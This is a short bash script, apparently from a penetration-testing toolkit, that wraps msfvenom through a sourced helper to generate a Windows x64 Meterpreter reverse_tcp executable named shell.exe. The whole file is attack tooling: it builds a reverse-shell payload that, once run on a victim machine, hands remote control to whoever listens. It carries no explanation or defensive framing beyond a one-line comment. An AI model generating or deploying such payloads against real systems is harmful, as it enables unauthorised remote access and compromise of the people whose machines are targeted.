#!/bin/bash

: '
Create EXE file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

payload="windows/x64/meterpreter/reverse_tcp"
format="exe"
filename="shell.exe"

create_reverse_shell "${payload}" "${format}" "${filename}"